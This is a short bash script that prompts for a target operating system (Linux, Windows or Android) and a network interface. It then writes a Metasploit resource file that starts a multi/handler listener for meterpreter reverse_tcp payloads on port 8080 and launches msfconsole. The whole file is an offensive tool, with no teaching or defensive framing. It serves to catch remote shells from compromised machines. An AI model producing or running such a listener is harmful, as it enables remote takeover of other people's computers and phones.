#/bin/bash

#make sure you type everything right.. otherwise no interface will be loaded

read -p "linux / windows / android  ? " host
read -p "What is your network interface (wlan0, wlan1, eth0 .. ): " interface
ip=$(ifconfig $interface|grep -w 'inet'|cut -d " " -f 10)
if [ $host == 'linux' ] || [ $host == 'windows' ]
then
    read -p "x64 or x86? (make sure to type exactly like it's shown) " type
    payload=$host/$type/meterpreter/reverse_tcp
elif [ $host == 'android' ]
then
    payload=android/meterpreter/reverse_tcp

fi

touch meta.rc 
echo "setg LHOST $ip" > meta.rc
echo "setg LPORT 8080" >> meta.rc
echo "use exploit/multi/handler" >> meta.rc
echo "set payload $payload" >> meta.rc
echo "set exitonsession false" >> meta.rc
echo "run -j" >> meta.rc
msfconsole -r meta.rc
